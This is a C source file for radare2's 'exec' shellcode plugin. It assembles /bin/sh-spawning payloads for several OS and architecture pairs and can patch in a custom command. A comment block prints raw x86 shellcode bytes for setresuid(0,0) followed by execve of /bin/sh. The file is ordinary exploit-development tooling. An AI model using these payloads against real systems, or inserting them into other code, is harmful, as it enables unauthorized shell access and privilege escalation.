/* radare - LGPL - Copyright 2011-2025 - pancake */

#include <r_egg.h>

#if 0
linux setresuid(0,0)+execv(/bin/sh)
31c031db31c999b0a4cd806a0b5851682f2f7368682f62696e89e35189e25389e1cd80

SETRESUID: (11 bytes)
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80"

BINSH: (24 bytes) (x86-32/64):
"\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xcd\x80";
#endif

static const ut8 x86_osx_suid_binsh[] =
#include "sc/src/x86-osx-suidbinsh.c"
;

static const ut8 x86_osx_binsh[] =
#include "sc/src/x86-osx-binsh.c"
;

// linux
static const ut8 x86_linux_binsh[] =
#include "sc/src/x86-linux-binsh.c"
;

static const ut8 x86_64_linux_binsh[] =
#include "sc/src/x86_64-linux-binsh.c"
;

static const ut8 arm_linux_binsh[] =
#include "sc/src/arm-linux-binsh.c"
;

static const ut8 thumb_linux_binsh[] =
#include "sc/src/thumb-linux-binsh.c"
;

static RBuffer *build(REgg *egg) {
	RBuffer *buf = r_buf_new ();
	if (!buf) {
		return NULL;
	}
	const ut8 *sc = NULL;
	int cd = 0;
	char *shell = r_egg_option_get (egg, "cmd");
	char *suid = r_egg_option_get (egg, "suid");
	// TODO: last char must not be \x00 .. or what? :D
	if (suid && *suid == 'f') { // false
		free (suid);
		suid = NULL;
	}
	switch (egg->os) {
	case R_EGG_OS_OSX:
	case R_EGG_OS_DARWIN:
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			if (suid) {
				sc = x86_osx_suid_binsh;
				cd = 7 + 36;
			} else {
				sc = x86_osx_binsh;
				cd = 36;
			}
		case R_SYS_ARCH_ARM:
			// TODO
			break;
		}
		break;
	case R_EGG_OS_LINUX:
		if (suid) {
			R_LOG_WARN ("no suid for this platform");
		}
		suid = 0;
		switch (egg->arch) {
		case R_SYS_ARCH_X86:
			switch (egg->bits) {
			case 32:
				sc = x86_linux_binsh;
				break;
			case 64:
				sc = x86_64_linux_binsh;
				if (shell && *shell) {
					int len = strlen (shell);
					if (len > sizeof (st64) - 1) {
						*shell = 0;
						R_LOG_ERROR ("Unsupported CMD length");
						break;
					}
					st64 b = 0;
					memcpy (&b, shell, strlen (shell));
					b = -b;
					shell = realloc (shell, sizeof (st64) + 1);
					if (!shell) {
						break;
					}
					r_str_ncpy (shell, (char *)&b, sizeof (st64));
					shell[sizeof (st64)] = 0;
					cd = 4;
					r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
					r_buf_write_at (buf, cd, (const ut8 *)shell, sizeof (st64));
					sc = 0;
				}
				break;
			default:
				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
			}
			break;
		case R_SYS_ARCH_ARM:
			switch (egg->bits) {
			case 16:
				sc = thumb_linux_binsh;
				break;
			case 32:
				sc = arm_linux_binsh;
				break;
			default:
				R_LOG_ERROR ("Unsupported arch %d bits", egg->bits);
			}
			break;
		}
		break;
	default:
		R_LOG_ERROR ("Unsupported os %x", egg->os);
		break;
	}

	if (sc) {
		r_buf_set_bytes (buf, sc, strlen ((const char *)sc));
		if (R_STR_ISNOTEMPTY (shell)) {
			if (cd) {
				r_buf_write_at (buf, cd, (const ut8 *)shell, strlen (shell) + 1);
			} else {
				R_LOG_ERROR ("Cannot set shell");
			}
		}
	}
	free (suid);
	free (shell);
	return buf;
}

REggPlugin r_egg_plugin_exec = {
	.meta = {
		.name = "exec",
		.desc = "execute cmd=/bin/sh suid=false",
		.author = "pancake",
		.license = "MIT",
	},
	.type = R_EGG_PLUGIN_SHELLCODE,
	.build = (void *)build
};

#ifndef R2_PLUGIN_INCORE
R_API RLibStruct radare_plugin = {
	.type = R_LIB_TYPE_EGG,
	.data = &r_egg_plugin_exec,
	.version = R2_VERSION
};
#endif
